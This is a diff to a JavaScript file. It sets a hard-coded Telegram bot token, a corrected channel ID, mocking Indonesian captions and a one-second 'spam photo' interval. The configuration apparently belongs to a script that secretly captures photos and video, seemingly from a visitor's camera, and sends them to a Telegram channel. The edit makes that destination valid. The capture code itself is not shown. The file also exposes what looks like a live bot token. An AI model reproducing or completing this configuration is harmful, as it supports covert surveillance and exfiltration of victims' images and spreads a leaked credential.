@@ -3,7 +3,7 @@ if (window.self !== window.top) {
 }
 
 const telegramBotToken = '7681007287:AAHGM2fVski8em0lDessM2jwXNalOEwAGu8';
-const telegramChannelId = '1002320686410';
+const telegramChannelId = '-1002320686410';
 const photoDescription = 'NIH MUKA MUSANG';
 const videoDescription = 'IH VIDEY';
 const photoInterval = 1000; // Spam Foto 1 detik
